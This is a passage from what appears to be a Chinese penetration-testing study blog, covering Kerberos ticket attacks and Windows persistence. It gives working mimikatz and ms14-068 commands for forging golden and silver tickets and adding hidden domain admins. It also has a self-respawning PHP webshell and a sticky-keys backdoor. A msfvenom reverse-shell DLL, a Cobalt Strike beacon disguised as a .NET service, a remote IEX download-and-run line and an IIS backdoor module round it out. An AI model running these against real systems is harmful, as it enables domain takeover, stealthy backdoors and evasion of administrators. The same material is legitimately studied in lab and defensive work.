ticket)"></a>白银票据(sliver ticket)</h5><p>白银票据依赖于服务账号的密码散列值，它的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。</p><p>票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志</p><h5 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h5><p>此漏洞位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。</p><h5 id="密码喷洒攻击-password-spraying"><a href="#密码喷洒攻击-password-spraying" class="headerlink" title="密码喷洒攻击(password spraying)"></a>密码喷洒攻击(password spraying)</h5><p>针对同一个用户进行连续密码猜测会导致帐户被锁定，所以对所有用户同时执行特定的密码登录尝试，增加破解的概率并降低帐户被锁定的概率，就是我们用固定的密码去跑用户名</p><h5 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h5><p>AS<em>REQ &amp; AS</em>REP 认证的过程是 Kerberos 身份认证的第一步，称为预身份验证，主要是为了防止密码脱机爆破。</p><p>如果域用户关闭 “Do not require Kerberos preauthentication”预身份验证这个选项(默认开启)的话，可以使用指定的用户去请求票据，向域控发送 AS_REQ 请求，此时域控会不作任何验证便将 TGT 票据和加密的Session-key 等信息返回。就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。</p><h3 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h3><p>介绍俩种域内攻击方法，黄金票据和白银票据</p><h4 id="金票"><a href="#金票" class="headerlink" title="金票"></a>金票</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>Kerberos 认证中，Client 通过 AS(身份认证服务)认证后，AS 会给 Client 一个Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。</p><p>有了金票后，就跳过AS 验证，不用验证账户和密码，所以也不担心域管密码修改</p><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul><li>不需要与AS进行交互</li><li>需要krbtgt的NTLM hash</li></ul><h5 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h5><p>伪造凭据，提升域内普通用户的权限</p><p><strong>登录进一个域内主机</strong></p><p><img src="/2022/03/09/day40/image-20220322140946587.png" alt="image-20220322140946587"></p><p><strong>搜集域相关信息</strong></p><pre class="line-numbers language-none"><code class="language-none">net config workstation或nltest /dsgetdc:域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322141008894.png" alt="image-20220322141008894"></p><p><img src="/2022/03/09/day40/image-20220322141108933.png" alt="image-20220322141108933"></p><p>首先先<strong>看此用户是否打了ms14-068的补丁</strong>，如果没打不返回信息</p><blockquote><p>需要注意的是域内普通用户提权成功后是有时效性的</p></blockquote><pre class="line-numbers language-none"><code class="language-none">systeminfo |find "3011780"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322141427493.png" alt="image-20220322141427493"></p><p>此时我们是没有访问域控的权限</p><p><img src="/2022/03/09/day40/image-20220322141451135.png" alt="image-20220322141451135"></p><p>接下来提权我们用到mimikatz和ms14-068</p><p>接下来我们<strong>用ms14-068伪造凭证</strong></p><p>首先<strong>查看用户的sid值</strong></p><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322141512915.png" alt="image-20220322141512915"></p><p>利用格式</p><pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u test@moonsec.fbi -p 123456 -s S-1-5-21-2801122135-3886333168-273474972-1103 -d 08server-dc.moonsec.fbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322141800541.png" alt="image-20220322141800541"></p><p>可看到在当前目录生成了凭证</p><p>接下来我们<strong>用mimikatz</strong></p><p><strong>清空之前缓存的凭证，导入伪造的凭证</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatzkerberos::purge  //清空票据kerberos::ptc 票据文件地址  //导入凭证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322142435189.png" alt="image-20220322142435189"></p><p>然我们<strong>再访问域控</strong>，发现有了权限</p><p>未导入之前拒绝访问，现在是可以访问了</p><p><img src="/2022/03/09/day40/image-20220322142555810.png" alt="image-20220322142555810"></p><p><strong>添加域管理员账号</strong></p><p>因为此提权具有时效性，我们需要做权限维持，建立一个影子账号，把它添加到域管理中</p><pre class="line-numbers language-none"><code class="language-none">net user xiaosha$ Qwe123... /add /domain&amp;&amp;net group "Domain Admins" xiaosha$ /add /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可用psexec反弹shell</p><pre class="line-numbers language-none"><code class="language-none">PsExec64.exe /accepteula /s \\08server-dc.moonsec.fbi cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322144646684.png" alt="image-20220322144646684"></p><h5 id="伪造金票"><a href="#伪造金票" class="headerlink" title="伪造金票"></a>伪造金票</h5><p>前提条件：</p><ol><li>域名称</li><li>域的 SID 值 </li><li>krbtgt 账号的 NTLM HASH</li><li>伪造任意用户名</li></ol><p><strong>登录域控管理员账户</strong></p><p><img src="/2022/03/09/day40/image-20220322150901460.png" alt="image-20220322150901460"></p><p>我们利用<strong>mimikatz导出krbtgt账户信息</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:moonsec.fbi /user:krbtgt" "exit"&gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322151303171.png" alt="image-20220322151303171"></p><p><strong>利用mimikatz制作黄金票据</strong></p><p>登录域普通用户，制作黄金票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "kerberos::golden /admin:system /domain:moonsec.fbi /sid:S-1-5-21-2801122135-3886333168-273474972 /krbtgt:811a536cf58aa23ceb8d439ffb386e6f /ticket:ticket.kirbi" exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>/admin：伪造的用户名</p><p>/domain：域名称</p><p>/sid：SID 值，注意去掉最后一个-后面的值</p><p>/krbtgt：krbtgt 的 HASH 值</p><p>/ticket：生成的票据名称 </p></blockquote><p><img src="/2022/03/09/day40/image-20220322151907174.png" alt="image-20220322151907174"></p><p>使用mimikatz导入黄金票据到内存</p><p>没导入之前我们无法访问域控，拒绝访问</p><pre class="line-numbers language-none"><code class="language-none">dir \\08server-dc\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入mimikatz，导入黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge #清除票据kerberos:: ptt 票据地址 #将票据注入内存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322152803356.png" alt="image-20220322152803356"></p><p>之后即便域管理密码改变，只要krbtgt没有改变，我们就有域控的权限</p><h4 id="银票"><a href="#银票" class="headerlink" title="银票"></a>银票</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST，从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务</p><p>所以我们知道server用户的hash就可以伪造ST，不会经过KDC，但是只对部分服务起作用</p><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><ol><li>不与KDC交互</li><li>需要server的NTLM hash</li></ol><h5 id="伪造银票"><a href="#伪造银票" class="headerlink" title="伪造银票"></a>伪造银票</h5><p><strong>登录域控管理员</strong></p><p><strong>使用mimikatz拿到账户信息</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt;log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322160145816.png" alt="image-20220322160145816"></p><p><img src="/2022/03/09/day40/image-20220322160335434.png" alt="image-20220322160335434"></p><p><strong>mimikatz伪造票据</strong></p><p>进入普通域用户</p><blockquote><p>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt;/service:&lt;服务类型&gt; /rc4:<ntlm hash=""> /user:&lt;用户名&gt; /ptt</ntlm></p><p>用户名任意，使用的服务可以从下面选择</p></blockquote><p><img src="/2022/03/09/day40/image-20220322160632683.png" alt="image-20220322160632683"></p><p>这里我们用CIFS服务</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden /domain:moonsec.fbi /sid:S-1-5-21-2801122135-3886333168-273474972 /target:08server-dc.moonsec.fbi /service:cifs /rc4:42e2656ec24331269f82160ff5962387 /user:administrator /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前缓存的票证</p><pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322161458234.png" alt="image-20220322161458234"></p><p>可以看到已经有了cifs服务的票证了，但是这里访问域控c盘没有成功</p><p><strong>kekeo伪造环境银票</strong></p><p>使用mimikatz没有成功，我们换一个工具尝试</p><p><strong>进入kekeo所在路径</strong></p><pre class="line-numbers language-none"><code class="language-none">kekeokerberos::purge //清除票据tgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec24331269f82160ff5962387<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220322162356184.png" alt="image-20220322162356184"></p><p><strong>将票据导入内存</strong></p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h4><p>获取权限不同，金票是伪造的TGT，可以获取任意kerberos的访问权限；银票是伪造的ST，只能访问指定的服务</p><p>认证流程不同，金票同TGS交互，不同AS交互；银票，不通过TGS交互，直接访问服务</p><p>加密方式不同，金票由krbtgt的 NTLM hash加密；银票由服务账号的 NTLM hash加密</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网基础知识及命令 </tag>
            
            <tag> 主机发现 </tag>
            
            <tag> token </tag>
            
            <tag> 横向渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows、linux权限维持</title>
      <link href="/2022/03/07/day39/"/>
      <url>/2022/03/07/day39/</url>
      
        <content type="html"><![CDATA[<h1 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h1><span id="more"></span><p>俩个方面，一个是web后门方面，一个是软件方面</p><h2 id="php不死马"><a href="#php不死马" class="headerlink" title="php不死马"></a>php不死马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php   ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.   set_time_limit(0);//通过set_time_limit(0)可以让程序无限制执行   $interval = 5; // 每隔*秒运行 do {  $filename = 'test.php';   if(file_exists($filename)) {     echo "xxx"; }else {     $file = fopen("test.php", "w");     $txt = "&lt;?php phpinfo();?&gt;\n";   fwrite($file, $txt);   fclose($file);   }  sleep($interval); } while (true); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在网站根目录写入此php文件，访问此文件</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.145/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就会生成test，删除后也会在5s再生成，而且关闭浏览器也会继续运行</p><p><img src="/2022/03/07/day39/image-20220307141356810.png" alt="image-20220307141356810"></p><p>只有重启apache服务才能停止</p><p>可以将php文件隐藏并且拒绝写入权限，就减少被发现的可能，且不会被删除</p><p><img src="/2022/03/07/day39/image-20220307141804830.png" alt="image-20220307141804830"></p><p><img src="/2022/03/07/day39/image-20220307141821005.png" alt="image-20220307141821005"></p><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>注册表</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在下面添加项，命名为要触发的名字，如xiaosha.exe，再项的右侧新建一个字符值Debugger，在其中写入你的后门绝对路径，这里写个C:\Windows\System32\cmd.exe</p><p><img src="/2022/03/07/day39/image-20220307142856319.png" alt="image-20220307142856319"></p><p>之后我们将一个exe改名为同名文件即可执行后门，这里是弹出cmd</p><p><img src="/2022/03/07/day39/image-20220307143855400.png" alt="image-20220307143855400"></p><h2 id="策略组脚本维持"><a href="#策略组脚本维持" class="headerlink" title="策略组脚本维持"></a>策略组脚本维持</h2><p>gpedit.msc打开组策略，再windows设置里的脚本的启动项加入后门</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以是你的后门exe，</p><p>测试放个1.bat</p><pre class="line-numbers language-none"><code class="language-none">net user xiaosha 123456 /add &amp; net localgroup administrators xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307144844191.png" alt="image-20220307144844191"></p><p>重启后会创建管理员账号</p><p><img src="/2022/03/07/day39/image-20220307145215211.png" alt="image-20220307145215211"></p><h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><p>再windows中连按5次shift会弹出如下</p><p><img src="/2022/03/07/day39/image-20220307145755085.png" alt="image-20220307145755085"></p><p>思路是连按5次shift让他执行后门</p><p>首先将sethc.exe的所有者改为administrator</p><p><img src="/2022/03/07/day39/image-20220307150141678.png" alt="image-20220307150141678"></p><p>修改他的权限</p><p><img src="/2022/03/07/day39/image-20220307150236660.png" alt="image-20220307150236660"></p><p>首先将sethc.exe改为sethc.exe.bat</p><pre class="line-numbers language-none"><code class="language-none">move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后将后门exe改为sethc.exe</p><pre class="line-numbers language-none"><code class="language-none">Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连按5次shift就会执行后门文件</p><p><img src="/2022/03/07/day39/image-20220307150516700.png" alt="image-20220307150516700"></p><h2 id="建立影子账号"><a href="#建立影子账号" class="headerlink" title="建立影子账号"></a>建立影子账号</h2><p>带$符号的账号，net user是看不到的，但是再计算机管理下用户和控制面板用户可看到</p><pre class="line-numbers language-none"><code class="language-none">net user xiaosha$ 123456 /add &amp; net localgroup administrators xiaosha$ /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>net user 看不到</p><p><img src="/2022/03/07/day39/image-20220307151733513.png" alt="image-20220307151733513"></p><p>计算机管理和控制面板可看到此用户</p><p><img src="/2022/03/07/day39/image-20220307151924869.png" alt="image-20220307151924869"></p><p><img src="/2022/03/07/day39/image-20220307151833309.png" alt="image-20220307151833309"></p><p>我们来把这个账号隐藏</p><p>打开注册表，SAM可能需要赋予权限</p><pre class="line-numbers language-none"><code class="language-none">HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ea是xiasha$的值，1F4是管理员的值</p><p>我们将管理员下的F值复制到xiaosha$下的F</p><p><img src="/2022/03/07/day39/image-20220307152354515.png" alt="image-20220307152354515"></p><p>然后导出3EA和xiaosha$</p><p><img src="/2022/03/07/day39/image-20220307152605257.png" alt="image-20220307152605257"></p><p>删除xiaosha$用户，再运行刚才导出的12进行导入</p><pre class="line-numbers language-none"><code class="language-none">net user xiaosha$ /del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后我们在net user、控制面版、计算机管理查看，也不会查看到xiaosha$用户</p><p>在注册表中会查看到</p><p>我们打开3389用此账号也可连接，证明此用户确实存在</p><p><img src="/2022/03/07/day39/image-20220307153058876.png" alt="image-20220307153058876"></p><h2 id="powershell-配置文件后门"><a href="#powershell-配置文件后门" class="headerlink" title="powershell 配置文件后门"></a>powershell 配置文件后门</h2><p>Powershell配置文件是一个powershell脚本，他在每次运行powershell的时候自动运行，所以我们向该文件写入后门，即可维持权限</p><p>首先查看是否存在配置文件</p><p>依次执行</p><pre class="line-numbers language-none"><code class="language-none">echo $profile Test-path $profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307153832108.png" alt="image-20220307153832108"></p><p>返回false需要我们创建一个</p><pre class="line-numbers language-none"><code class="language-none">New-Item -Path $profile -Type File –Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307153909102.png" alt="image-20220307153909102"></p><p>接下来将后门文件写入配置文件</p><pre class="line-numbers language-none"><code class="language-none">$string = 'Start-Process "C:\1.bat"' $string | Out-File -FilePath $profile -Append more $profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的1.bat是我的创建管理员xiaosha命令</p><p><img src="/2022/03/07/day39/image-20220307154115687.png" alt="image-20220307154115687"></p><p>接下来net user 查看用户，不存在xiaosha；运行powershell，再次查看，存在xiaosha</p><p><img src="/2022/03/07/day39/image-20220307154343429.png" alt="image-20220307154343429"></p><h2 id="Monitor权限维持"><a href="#Monitor权限维持" class="headerlink" title="Monitor权限维持"></a>Monitor权限维持</h2><p>白+黑方法，exe是正常，dll是后门。之后将exe放到打印机做权限维持</p><p>地址<a href="https://github.com/Al1ex/Monitor">https://github.com/Al1ex/Monitor</a></p><p>下载该项目后使用VS编译Monitor.cpp，当然也可以使用编译好的，release是编译好的</p><p>Monitor.cpp代码</p><pre class="line-numbers language-none"><code class="language-none">#include "Windows.h" int main() {     MONITOR_INFO_2 monitorInfo;     TCHAR env[12] = TEXT("Windows x64");     TCHAR name[12] = TEXT("Monitor");     TCHAR dll[12] = TEXT("test.dll");     monitorInfo.pName = name; monitorInfo.pEnvironment = env;     monitorInfo.pDLLName = dll;     AddMonitor(NULL, 2, (LPBYTE)&amp;monitorInfo);     return 0; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>pName //监视器名称</li><li>pEnvironment //环境架构</li><li>pDLLName //监视器DLL文件的名称</li></ul><p>我们把Monitor.exe放到system32下</p><p>msfvenom生成反向连接dll</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.134 LPORT=4444 -f dll &gt; test.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将生成的test.dll也放到system32下</p><p>msf监听</p><p>运行Monitor.exe即可拿到一个meterpreter session</p><p>接下来做下权限维持</p><p>我们需要在注册表下的Monitors设置一个key</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可用命令实现，创建一个注册表项，其中将包含test.dll</p><pre class="line-numbers language-none"><code class="language-none">reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307172611847.png" alt="image-20220307172611847"></p><p>接下来重启时，spoolsv.exe进程将自动将加载Monitors注册表项中存在且存储在Windows文件夹System32中的所有驱动程序DLL文件</p><p>重新监听，重启后仍然得到meterpreter session</p><h2 id="安全描述符隐藏服务后门"><a href="#安全描述符隐藏服务后门" class="headerlink" title="安全描述符隐藏服务后门"></a>安全描述符隐藏服务后门</h2><p>将cs放在kali，在cs中运行teamserver</p><pre class="line-numbers language-none"><code class="language-none">sudo ./teamserver 192.168.80.134 123456 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有运行chmod +x 加个运行权限</p><p>本机cs连接 监听</p><p><img src="/2022/03/07/day39/image-20220307202539385.png" alt="image-20220307202539385"></p><p>生成后门 </p><p><img src="/2022/03/07/day39/image-20220307202957072.png" alt="image-20220307202957072"></p><p><img src="/2022/03/07/day39/image-20220307203009779.png" alt="image-20220307203009779"></p><p>将生成的后门放到靶机administrator下</p><p><img src="/2022/03/07/day39/image-20220307203201476.png" alt="image-20220307203201476"></p><p><strong>通过注册服务创建后门</strong></p><p>将后门程序注册为自启动服务，通常可以通过sc或者powershell来进行创建。</p><p>cmd创建自启动服务</p><pre class="line-numbers language-none"><code class="language-none">sc create ".NET CLR Networking 3.5.0.0" binpath= "cmd.exe /k C:\Users\administrator\beacon.exe" depend= Tcpip obj= Localsystem start= auto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>powershell创建自启动服务</p><pre class="line-numbers language-none"><code class="language-none">new-service –Name ".NET CLR Networking 3.5.0.0" –DisplayName ".NET CLR Networking 3.5.0.0" –BinaryPathName "cmd.exe /k C:\Users\administrator\beacon.exe" – StartupType AutomaticDelayedStart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.NET CLR Networking 3.5.0.0是伪造的服务名称，最好写的具有迷惑性</p><p>运行后创建服务，是停止状态我们运行即可在本机cs监听下拿到一个后门</p><p><img src="/2022/03/07/day39/image-20220307203729009.png" alt="image-20220307203729009"></p><p>开启服务，可接收后门</p><p><img src="/2022/03/07/day39/image-20220307204209626.png" alt="image-20220307204209626"></p><p>但是创建的服务很容易被发现</p><p>比如 sc query或Get-Service</p><pre class="line-numbers language-none"><code class="language-none">cmdsc query | findstr "服务名"powershellget-service | findstr "服务名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307210011192.png" alt="image-20220307210011192"></p><p>即便我们伪造了服务名，还是会存在风险，我们可以做隐藏</p><p><strong>通过修改SDDL(安全描述符)隐藏服务</strong></p><p>众所周知，windows访问控制模型分为两部分：</p><ul><li>access token(访问令牌)</li><li>安全描述符</li></ul><p>安全描述符包含与安全对象关联的安全信息。安全描述符包含安全描述符结构及其关联的安全信息。安全描述符可以包含以下安全信息：</p><ul><li>对象的所有者和主要组的 Sid（安全标识符）</li><li>用于指定允许或拒绝特定用户或组的访问权限的 DACL 。</li><li>指定为对象生成审核记录的访问尝试类型的 SACL 。</li><li>一组限制安全描述符或其各个成员的含义的控制位。</li></ul><p>windows中的安全对象都使用SDDL字符串来表示访问对象对于安全对象的权限，服务自然也存在其SDDL，并且sc命令中可以设置SDDL。那么通过更改SDDL可以修改服务的各种权限来隐藏服务：</p><pre class="line-numbers language-none"><code class="language-none">sc sdset ".NET CLR Networking 3.5.0.0" "D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行后任务管理器、sc query、Get-Service均查询不到</p><p>但是如果管理员查看注册表会很容易发现异常值，</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 3.5.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220307210815585.png" alt="image-20220307210815585"></p><p>如果看到这就很容易发现问题</p><p><strong>修改注册表ACL</strong></p><p>可以修改注册表的DACL来拒绝对值的查询，达到隐藏效果</p><p>我们使用一个powershell脚本</p><p>1.ps1</p><pre class="line-numbers language-none"><code class="language-none">function Server-Sddl-Change{[CmdletBinding()]    param    (        [parameter(Mandatory=$false)][String]$Name    )$ROOT = "HKLM:\SYSTEM\CurrentControlSet\Services\"$S = $ROOT+$NAME$acl = Get-Acl $S$acl.SetAccessRuleProtection($true, $false)$person = [System.Security.Principal.NTAccount]"Everyone"$access = [System.Security.AccessControl.RegistryRights]"QueryValues"$inheritance = [System.Security.AccessControl.InheritanceFlags]"None"$propagation = [System.Security.AccessControl.PropagationFlags]"None"$type = [System.Security.AccessControl.AccessControlType]"Deny"$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `$person,$access,$inheritance,$propagation,$type)$acl.AddAccessRule($rule)$person = [System.Security.Principal.NTAccount]"Everyone"$access = [System.Security.AccessControl.RegistryRights]"SetValue,CreateSubKey,EnumerateSubKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,ChangePermissions,TakeOwnership"$inheritance = [System.Security.AccessControl.InheritanceFlags]"None"$propagation = [System.Security.AccessControl.PropagationFlags]"None"$type = [System.Security.AccessControl.AccessControlType]"Allow"$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `$person,$access,$inheritance,$propagation,$type)$acl.AddAccessRule($rule)Set-Acl $S $acl}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这个脚本放到kali，开启web服务</p><p>在靶机远程加载此脚本</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('http://192.168.80.134/1.ps1'));Server-Sddl-Change - Name '.NET CLR Networking 3.5.0.0'"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启靶机，在注册表就看不到此异常值，且本机cs也拿到了后门</p><h2 id="iis后门"><a href="#iis后门" class="headerlink" title="iis后门"></a>iis后门</h2><p>web服务器上一般都支持net，可以考虑利用net iis做一个后门</p><p>项目地址 <a href="https://github.com/WBGlIl/IIS_backdoor">https://github.com/WBGlIl/IIS_backdoor</a></p><p>在网站根目录下新建一个bin文件夹，存放dll集。把IIS_backdoor_dll.dll存放进去</p><p>新建 web.config 或者在原有的文件上添加内容</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;configuration&gt;     &lt;system.webServer&gt;         &lt;modules&gt;             &lt;add name="IIS_backdoor" type="IIS_backdoor_dll.IISModule" /&gt;         &lt;/modules&gt;     &lt;/system.webServer&gt; &lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开iis_backdoor_shell将网址填入即可运行命令</p><p><img src="/2022/03/07/day39/image-20220308133207885.png" alt="image-20220308133207885"></p><p>可以将后门IIS_backdoor_dll.dll只读隐藏，这样减少了被发现的可能</p><h2 id="windows-隐藏技术"><a href="#windows-隐藏技术" class="headerlink" title="windows 隐藏技术"></a>windows 隐藏技术</h2><p>刚才把iis后门只读隐藏，还是会存在被发现的可能，管理员只要显示隐藏文件还是会发现它</p><p>接下来我们再做一层隐藏，再次减少被发现的可能</p><p>使用Attrib +s +a +h +r命令，把原本的文件夹增加了 系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><pre class="line-numbers language-none"><code class="language-none">Attrib +s +a +h +r IIS_backdoor_dll.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的话即便勾选 显示隐藏文件 还是发现不了</p><p><img src="/2022/03/07/day39/image-20220308134242848.png" alt="image-20220308134242848"></p><p>但是还是有办法发现它</p><p>再刚才勾选显示隐藏文件的右侧有一个选项，再查看中取消所指的勾选框，</p><p><img src="/2022/03/07/day39/image-20220308134326615.png" alt="image-20220308134326615"></p><p>这样再显示隐藏文件下就可看到刚才的文件</p><h2 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h2><p>驱动隐藏最典型的现象就是系统盘中存在以下文件：</p><pre class="line-numbers language-none"><code class="language-none">c:\WINDOWS\xlkfs.dat c:\WINDOWS\xlkfs.dll c:\WINDOWS\xlkfs.ini 